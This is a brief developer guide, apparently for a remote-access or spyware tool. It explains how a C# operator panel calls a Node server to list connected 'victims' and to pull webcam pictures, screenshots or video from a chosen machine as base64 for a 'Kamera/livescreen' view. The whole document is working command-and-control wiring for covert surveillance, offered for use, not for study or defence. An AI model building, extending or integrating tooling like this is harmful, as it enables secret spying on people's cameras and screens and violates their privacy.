# How the Hiatme Tool Suite (C#) should use this server

The Tool Suite should talk to the Node server over **HTTP** instead of the old C# Server.

## 1. List clients

Before showing the list of “victims”/clients (e.g. for Kamera or livescreen), call:

```
GET http://<server-ip>:3000/api/clients
```

Response:

```json
{ "clients": [ { "id": "...", "pcname": "...", "language": "...", "model": "...", "version": "...", "connectedAt": "..." }, ... ] }
```

Use this to populate the client dropdown/list. Store the server base URL (e.g. `http://192.168.1.x:3000`) in config or `MainValues` so it’s configurable.

## 2. Request picture / video from a client

When the user picks a client and asks for a picture (or screenshot/video), call:

```
POST http://<server-ip>:3000/api/request-media
Content-Type: application/json

{ "clientId": "<id from /api/clients>", "mediaType": "picture" }
```

`mediaType` can be `"picture"`, `"screenshot"`, or `"video"` (server forwards to client; client decides how to fulfill each).

Response (success):

```json
{ "data": "<base64 image/video data>", "mimeType": "image/jpeg" }
```

Decode the base64 and show in the existing Kamera/livescreen UI. On error you get `502`/`504` with an `error` message.

## 3. Where to hook this in the Tool Suite

- **Client list:** Replace (or parallel) the old “request client list from C# Server” with `GET /api/clients`.
- **Kamera / livescreen:** Replace the old “send SCREENLIVEOPEN / request to C# Server for victim X” with `POST /api/request-media` for that client’s `id`, then display the returned `data` (base64) in the existing picture box or video control.

Use `HttpClient` (or `WebRequest`) in C#; no WebSocket needed for the Tool Suite unless you add live streaming later.
